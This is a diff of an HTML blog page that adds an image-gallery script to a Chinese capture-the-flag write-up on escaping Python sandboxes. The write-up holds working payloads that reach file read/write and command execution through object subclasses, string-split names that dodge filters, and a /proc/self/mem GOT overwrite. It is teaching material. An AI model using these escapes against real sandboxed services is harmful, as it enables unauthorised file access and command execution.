@@ -6,12 +6,10 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="思考了一下，Python沙箱逃逸的意义，不过就是如何通过绕过限制，拿到出题人或者安全运维人员不想让我们拿到的”危险函数”，或者绕过Python终端达到命令执行的效果。 起因以前我也做过一些Python沙盒逃逸的小题目，也翻译和写过两篇关于Python沙盒逃逸的文章。然而在这次国赛的题目，我好像又进一步理解了Python沙箱… 绕过沙盒方法关于import通常思路，我们应该找到题目还给我们留下了什么">
-<meta property="og:type" content="article">
+    <meta property="og:type" content="article">
 <meta property="og:title" content="Python 沙盒绕过">
 <meta property="og:url" content="https://bestwing.me/awesome-python-sandbox-in-ciscn.html">
 <meta property="og:site_name" content="Swing&#39;Blog 有恨无人省">
-<meta property="og:description" content="思考了一下，Python沙箱逃逸的意义，不过就是如何通过绕过限制，拿到出题人或者安全运维人员不想让我们拿到的”危险函数”，或者绕过Python终端达到命令执行的效果。 起因以前我也做过一些Python沙盒逃逸的小题目，也翻译和写过两篇关于Python沙盒逃逸的文章。然而在这次国赛的题目，我好像又进一步理解了Python沙箱… 绕过沙盒方法关于import通常思路，我们应该找到题目还给我们留下了什么">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/python-sanbox-01.jpg">
 <meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/python-sanxbox-02.jpg">
@@ -168,7 +166,7 @@
   
 
   <div class="content" itemprop="articleBody">
-    <p>思考了一下，Python沙箱逃逸的意义，不过就是如何通过绕过限制，拿到出题人或者安全运维人员不想让我们拿到的”危险函数”，或者绕过Python终端达到命令执行的效果。</p>
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>思考了一下，Python沙箱逃逸的意义，不过就是如何通过绕过限制，拿到出题人或者安全运维人员不想让我们拿到的”危险函数”，或者绕过Python终端达到命令执行的效果。</p>
 <h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>以前我也做过一些Python沙盒逃逸的小题目，也翻译和写过两篇关于Python沙盒逃逸的文章。然而在这次国赛的题目，我好像又进一步理解了Python沙箱…</p>
 <h3 id="绕过沙盒方法"><a href="#绕过沙盒方法" class="headerlink" title="绕过沙盒方法"></a>绕过沙盒方法</h3><h4 id="关于import"><a href="#关于import" class="headerlink" title="关于import"></a>关于import</h4><p>通常思路，我们应该找到题目还给我们留下了什么，通常而言<br>通常而言，出题人一般是禁止引入敏感包，比如 <strong>os</strong>或者<strong>system</strong>，</p>
 <h5 id="0x01-绕过，通过路径引入"><a href="#0x01-绕过，通过路径引入" class="headerlink" title="0x01 绕过，通过路径引入"></a>0x01 绕过，通过路径引入</h5><p>Python的os模块的路径几乎都是/usr/lib/python2.7/os.py中<br>所以我们可以通过路径引入一些模块</p>
@@ -189,7 +187,7 @@
 <h5 id="创建对象，以及引用"><a href="#创建对象，以及引用" class="headerlink" title="创建对象，以及引用"></a>创建对象，以及引用</h5><p>python的object类中集成了很多的基础函数，我们想要调用的时候也是可以通过创建对象进而引用</p>
 <p>有常见的两个方法</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[0]</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[2]</span><br></pre></td></tr></table></figure>
-<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/python-sanbox-01.jpg"></p>
+<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/python-sanbox-01.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/python-sanbox-01.jpg"></a></p>
 <p>如，我们可通过<br><code>print ().__class__.__bases__[0].__subclasses__()[40](&quot;/etc/services&quot;).read()</code>达到文件读取的效果，</p>
 <p><strong>常见payload</strong></p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#读文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">r&#x27;C:\1.php&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment">#写文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/var/www/html/input&#x27;</span>, <span class="string">&#x27;w&#x27;</span>).write(<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行任意命令</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27;</span> )</span><br></pre></td></tr></table></figure>
@@ -212,7 +210,7 @@
 <h4 id="write修改got表"><a href="#write修改got表" class="headerlink" title="write修改got表"></a>write修改got表</h4><p>实际上是一个**/proc/self/mem<strong>的内存操作方法<br>**/proc/self/mem</strong>是内存镜像，能够通过它来读写到进程的所有内存，包括可执行代码，如果我们能获取到Python一些函数的偏移，如<strong>system</strong>，我们就能通过想做pwn题的劫持got表做我们任意想做的事情</p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">lambda</span> r,w:r.seek(<span class="number">0x08de2b8</span>) <span class="keyword">or</span> w.seek(<span class="number">0x08de8c8</span>) <span class="keyword">or</span> w.write(r.read(<span class="number">8</span>)) <span class="keyword">or</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;c&#x27;</span>+<span class="string">&#x27;at /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb&#x27;</span>))(().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/proc/self/mem&#x27;</span>,<span class="string">&#x27;r&#x27;</span>),().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/proc/self/mem&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="number">0</span>))</span><br></pre></td></tr></table></figure>
 <p>第一个地址是system的偏移，第二个是fopen的偏移，我们可以通过<strong>objdump</strong>获取相关信息</p>
-<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/python-sanxbox-02.jpg"></p>
+<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/python-sanxbox-02.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/python-sanxbox-02.jpg"></a></p>
 <h2 id="关于这次的题目"><a href="#关于这次的题目" class="headerlink" title="关于这次的题目"></a>关于这次的题目</h2><p>我们可以通过<br><code>print ().__class__.__bases__[0].__subclasses__()[40](&quot;/home/ctf/sandbox.py&quot;).read()</code><br>获取题目源码，然后进一步分析</p>
 <h3 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h3><p>三种方法</p>
 <h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x = [x <span class="keyword">for</span> x <span class="keyword">in</span> [].__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">&#x27;ca&#x27;</span>+<span class="string">&#x27;tch_warnings&#x27;</span>][<span class="number">0</span>].__init__</span><br><span class="line">x.__getattribute__(<span class="string">&quot;func_global&quot;</span>+<span class="string">&quot;s&quot;</span>)[<span class="string">&#x27;linecache&#x27;</span>].__dict__[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>].__dict__[<span class="string">&#x27;sy&#x27;</span>+<span class="string">&#x27;stem&#x27;</span>](<span class="string">&#x27;l&#x27;</span>+<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">x.__getattribute__(<span class="string">&quot;func_global&quot;</span>+<span class="string">&quot;s&quot;</span>)[<span class="string">&#x27;linecache&#x27;</span>].__dict__[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>].__dict__[<span class="string">&#x27;sy&#x27;</span>+<span class="string">&#x27;stem&#x27;</span>](<span class="string">&#x27;l&#x27;</span>+<span class="string">&#x27;s /home/ctf&#x27;</span>)</span><br><span class="line">x.__getattribute__(<span class="string">&quot;func_global&quot;</span>+<span class="string">&quot;s&quot;</span>)[<span class="string">&#x27;linecache&#x27;</span>].__dict__[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>].__dict__[<span class="string">&#x27;sy&#x27;</span>+<span class="string">&#x27;stem&#x27;</span>](<span class="string">&#x27;ca&#x27;</span>+<span class="string">&#x27;t /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb&#x27;</span>)</span><br></pre></td></tr></table></figure>
@@ -221,7 +219,12 @@
 <h4 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h4><p>间接引用<br>在不断的dir过程中，发现<strong>closure</strong> 这个object保存了参数，可以引用原生的<strong>import</strong></p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> __import__.__getattribute__(<span class="string">&#x27;__clo&#x27;</span>+<span class="string">&#x27;sure__&#x27;</span>)[<span class="number">0</span>].cell_contents(<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>).__getattribute__(<span class="string">&#x27;sy&#x27;</span>+<span class="string">&#x27;stem&#x27;</span>)(<span class="string">&#x27;l&#x27;</span>+<span class="string">&#x27;s home&#x27;</span>) </span><br></pre></td></tr></table></figure>
 <h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/52#toc-10">https://xz.aliyun.com/t/52#toc-10</a><br><a href="https://blog.csdn.net/qq_35078631/article/details/78504415">https://blog.csdn.net/qq_35078631/article/details/78504415</a><br><a href="https://www.anquanke.com/post/id/85571">https://www.anquanke.com/post/id/85571</a></p>
-
+</div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
   </div>
 </article>
 
